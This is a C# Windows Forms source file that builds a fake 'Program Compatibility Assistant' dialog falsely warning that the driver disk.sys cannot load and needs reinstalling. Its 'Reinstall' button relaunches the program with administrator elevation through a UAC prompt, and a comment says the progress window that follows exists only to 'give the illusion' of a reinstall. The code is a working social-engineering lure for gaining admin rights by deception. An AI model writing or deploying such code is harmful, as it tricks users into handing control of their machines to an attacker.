using StartPrompt; // import my custom namespace
using SysView;

using System;
using System.Drawing;
using Microsoft.Win32;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;
using System.Drawing.Drawing2D;

public class DiversionPrompt : Form
{
    SystemData sd = new SystemData();
    bool lightMode;

    public DiversionPrompt()
    {
        lightMode = sd.UsingLightTheme();

        this.Text = "Program Compatibility Assistant";
        this.FormBorderStyle = FormBorderStyle.FixedDialog;
        this.Size = new Size(460, 300);
        this.StartPosition = FormStartPosition.CenterScreen;

        if (!lightMode)
        {
            this.BackColor = Color.FromArgb(32, 32, 32); // Dark background
            this.ForeColor = Color.White;
        }

        // Warning icon
        this.Icon = SystemIcons.Warning;
        
        // Error Title
        Label titleLabel = new Label
        {
            Text = "A driver cannot load on this device",
            Font = new Font("Segoe UI", 11, FontStyle.Bold),
            Location = new Point(30, 20),
            Size = new Size(370, 30)
        };
        this.Controls.Add(titleLabel);

        // Error Info
        Label driverInfo = new Label
        {
            Text = "Driver: disk.sys\ndisk.sys\n\nWindows cannot load "+
                   "this critical driver and requires reinstall.\n"+
                   "You'll need to reinstall this driver or your device may become unstable!",
            Font = new Font("Segoe UI", 9),
            Location = new Point(30, 60),
            Size = new Size(370, 100)
        };
        this.Controls.Add(driverInfo);

        CurvedButton learnMore = new CurvedButton(5, 2);
        learnMore.Text = "Learn more";
        learnMore.ForeColor = Color.Black;
        learnMore.Location = new Point(30, 210);
        learnMore.Size = new Size(195, 30);
        learnMore.BackColor = Color.LightSkyBlue;
        learnMore.FlatStyle = FlatStyle.Flat;

        // Add event handlers for mouse and keyboard interactions
        learnMore.MouseEnter += ButtonOnFocus;
        learnMore.MouseLeave += ButtonOffFocus;
        learnMore.GotFocus += ButtonOnFocus;
        learnMore.LostFocus += ButtonOffFocus;

        learnMore.Click += (s, e) => MessageBox.Show("Redirecting to help page...");
        this.Controls.Add(learnMore);

        CurvedButton reinstallButton = new CurvedButton(5, 2);
        reinstallButton.Text = "Reinstall";
        reinstallButton.Location = new Point(230, 210);
        reinstallButton.Size = new Size(185, 30);
        reinstallButton.FlatStyle = FlatStyle.Flat;
        
        if (!lightMode)
        {
            reinstallButton.BackColor = Color.FromArgb(64, 64, 64);
            reinstallButton.ForeColor = Color.White;
        }

        // Add event handlers for mouse and keyboard interactions
        reinstallButton.MouseEnter += ButtonOnFocus;
        reinstallButton.MouseLeave += ButtonOffFocus;
        reinstallButton.GotFocus += ButtonOnFocus;
        reinstallButton.LostFocus += ButtonOffFocus;

        reinstallButton.Click += ReinstallDriver;
        this.Controls.Add(reinstallButton);
    }

//==============================================================================
//==============================================================================
//==============================================================================
    
    void ButtonOnFocus(object sender, EventArgs e)
    {
        CurvedButton b = (CurvedButton)sender;
        if (!lightMode)
        {
            b.borderColor = Color.White;
        } else
            {
                b.borderColor = Color.Black;
            }
    }
    
    void ButtonOffFocus(object sender, EventArgs e)
    {
        CurvedButton b = (CurvedButton)sender;
        b.borderColor = Color.Transparent;
    }

    // Create a fake progress bar to give the illusion that we are reinstalling
    // the driver and its dependencies
    void ReinstallDriver(object sender, EventArgs e) {
        ProcessStartInfo psi = new ProcessStartInfo
        {
            FileName = Application.ExecutablePath,
            Arguments = "--repair",
            Verb = "runas", // triggers UAC to elevate privs
            UseShellExecute = true
        };

        try
        {
            Process.Start(psi);

            Thread.Sleep(500);

            Thread t = new Thread(new ThreadStart(InstallerForm));
            t.Start();

            // kill diversion prompt so only one form is up at a time for now
            this.Close();
        } catch
            {
                // User probably clicked "No" on the UAC prompt
                Console.WriteLine("User denied elevation.");
            }
    }

    void InstallerForm() {
        InstallerPrompt iP = new InstallerPrompt();
        iP.ShowDialog();
    }

    // This method provides external objects to trigger this winform
    public void ShowPrompt()
    {
        Application.EnableVisualStyles();
        Application.Run(new DiversionPrompt());
    }
}